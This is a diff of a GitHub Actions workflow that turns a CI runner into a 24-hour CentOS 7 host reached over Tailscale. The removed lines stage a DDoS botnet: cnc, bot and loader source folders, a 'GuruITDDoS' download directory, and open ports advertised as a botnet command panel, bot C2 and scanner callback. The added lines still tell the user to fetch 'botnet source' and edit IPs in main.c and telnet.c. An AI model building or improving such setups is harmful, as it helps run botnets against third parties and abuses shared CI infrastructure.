@@ -1,4 +1,4 @@
-name: CentOS7-Minimal-Builder
+name: CentOS7-Tailscale-Only
 
 on:
   workflow_dispatch:
@@ -28,60 +28,51 @@ jobs:
             centos:7 /sbin/init
           sleep 10
 
-      - name: Fix CentOS 7 Repositories
+      - name: 🔥 NUKE Broken Repos & Setup VAULT Only
         run: |
           docker exec centos7 bash -c '
-            # Backup and replace with vault repos
-            cp -f /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak 2>/dev/null || true
+            # Delete ALL existing repo files (they are broken)
+            rm -rf /etc/yum.repos.d/*.repo
+
+            # Create fresh vault repo (NO mirrorlist.centos.org)
             echo "[base]" > /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=CentOS-7 - Base" >> /etc/yum.repos.d/CentOS-Vault.repo
-            echo "baseurl=http://vault.centos.org/7.9.2009/os/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
+            echo "baseurl=https://vault.centos.org/7.9.2009/os/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgcheck=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
+
             echo "[updates]" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=CentOS-7 - Updates" >> /etc/yum.repos.d/CentOS-Vault.repo
-            echo "baseurl=http://vault.centos.org/7.9.2009/updates/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
+            echo "baseurl=https://vault.centos.org/7.9.2009/updates/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgcheck=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
+
             echo "[extras]" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=CentOS-7 - Extras" >> /etc/yum.repos.d/CentOS-Vault.repo
-            echo "baseurl=http://vault.centos.org/7.9.2009/extras/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
+            echo "baseurl=https://vault.centos.org/7.9.2009/extras/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgcheck=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
+
             echo "[epel]" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=Extra Packages for Enterprise Linux 7 - \$basearch" >> /etc/yum.repos.d/CentOS-Vault.repo
-            echo "baseurl=http://download.fedoraproject.org/pub/epel/7/\$basearch" >> /etc/yum.repos.d/CentOS-Vault.repo
+            echo "baseurl=https://download.fedoraproject.org/pub/epel/7/\$basearch" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgcheck=0" >> /etc/yum.repos.d/CentOS-Vault.repo
-            yum clean all
-            rm -rf /var/cache/yum/*
-          '
 
-      - name: Install Essential Tools
-        run: |
-          docker exec centos7 bash -c '
-            yum install -y epel-release
-            yum update -y
-            yum install -y \
-              gcc gcc-c++ make \
-              wget curl git \
-              screen nano \
-              tar bzip2 gzip \
-              python3 \
-              glibc-static \
-              gmp-devel \
-              httpd \
-              xinetd tftp tftp-server \
-              iptables-services \
-              firewalld \
-              --skip-broken
+            # Clean yum cache
+            yum clean all
+            rm -rf /var/cache/yum
+
+            # Test yum – should work now
+            yum repolist
           '
+          echo "✅ CentOS 7 repos fixed – vault.centos.org is now the only source."
 
       - name: Install Tailscale
         env:
@@ -94,60 +85,36 @@ jobs:
             sleep 5
             tailscale up --authkey=$TAILSCALE_AUTH_KEY --hostname=centos7-builder --ssh
             sleep 5
-            TS_IP=$(tailscale ip -4 2>/dev/null)
+            TS_IP=$(tailscale ip -4)
             echo "TAILSCALE_IP=$TS_IP" >> /etc/environment
-            echo "✅ Tailscale IP: $TS_IP"
+            echo "✅ Tailscale connected – IP: $TS_IP"
           '
 
-      - name: Configure Firewall
+      - name: Display Access Info
         run: |
-          docker exec centos7 bash -c '
-            systemctl start firewalld 2>/dev/null || service firewalld start 2>/dev/null || true
-            firewall-cmd --permanent --direct --add-rule ipv4 filter INPUT 0 \
-              -i tailscale0 -p tcp --dport 1302 -j ACCEPT 2>/dev/null || true
-            firewall-cmd --permanent --add-port={80,443,1302,9473}/tcp 2>/dev/null || true
-            firewall-cmd --permanent --add-port=69/udp 2>/dev/null || true
-            firewall-cmd --reload 2>/dev/null || true
-            iptables -I INPUT -i tailscale0 -p tcp --dport 1302 -j ACCEPT 2>/dev/null || true
-            echo "✅ Firewall configured"
-          '
-
-      - name: Copy Source Files (if present)
-        run: |
-          docker exec centos7 mkdir -p /root/cnc /root/bot /root/loader
-          docker exec centos7 mkdir -p /var/www/html/GuruITDDoS
-          [ -d "./cnc" ] && docker cp ./cnc/. centos7:/root/cnc/
-          [ -d "./bot" ] && docker cp ./bot/. centos7:/root/bot/
-          [ -d "./loader" ] && docker cp ./loader/. centos7:/root/loader/
-
-      - name: Display Connection Info
-        run: |
-          TS_IP=$(docker exec centos7 tailscale ip -4 2>/dev/null || echo "Not connected")
-          PUBLIC_IP=$(curl -s ifconfig.me)
+          TS_IP=$(docker exec centos7 tailscale ip -4 2>/dev/null)
           echo ""
-          echo "========================================="
-          echo "✅ CentOS 7 Container is READY!"
-          echo "========================================="
-          echo "🔵 TAILSCALE IP: $TS_IP"
-          echo "   - CNC Admin Panel: $TS_IP:1302"
-          echo "   - SSH: docker exec -it centos7 bash"
+          echo "═══════════════════════════════════════════════════════════════"
+          echo "  ✅ CENTOS 7 CONTAINER IS READY"
+          echo "═══════════════════════════════════════════════════════════════"
           echo ""
-          echo "🌐 PUBLIC IP: $PUBLIC_IP"
-          echo "   - HTTP Download: http://$PUBLIC_IP/GuruITDDoS/"
-          echo "   - Bot C2: $PUBLIC_IP:1302"
-          echo "   - Scanner Callback: $PUBLIC_IP:9473"
+          echo "  🔵 TAILSCALE IP: $TS_IP"
+          echo "     └─ SSH / RDP not needed – use docker exec:"
           echo ""
-          echo "📁 Your source files: /root/cnc, /root/bot, /root/loader"
-          echo "   (if you placed them in your repo)"
+          echo "  💻 COMMAND TO ENTER CONTAINER:"
+          echo "     docker exec -it centos7 bash"
           echo ""
-          echo "⚙️  Next steps:"
-          echo "   1. docker exec -it centos7 bash"
-          echo "   2. Edit IPs in /root/bot/main.c and /root/loader/telnet.c"
-          echo "   3. cd /root && chmod +x build.sh && ./build.sh"
-          echo "   4. Start services (./cnc, ./scanListen, ./loader, systemctl start httpd)"
+          echo "  📁 YOUR WORKSPACE FILES: /workspace (if you checked out code)"
           echo ""
-          echo "⏳ Container will stay alive for 24 hours."
-          echo "========================================="
+          echo "  ⚠️  NEXT STEPS (DO THIS MANUALLY INSIDE CONTAINER):"
+          echo "     1. yum install -y wget curl git gcc make glibc-static gmp-devel"
+          echo "     2. Download your botnet source or copy from /workspace"
+          echo "     3. Edit IP addresses (main.c, telnet.c, etc.)"
+          echo "     4. Install Go, compilers, MySQL, etc. – you have full control"
+          echo ""
+          echo "  ⏳ Container will stay alive for 24 hours."
+          echo "═══════════════════════════════════════════════════════════════"
+          echo ""
 
       - name: Keep Container Alive (24h)
         run: sleep 86400
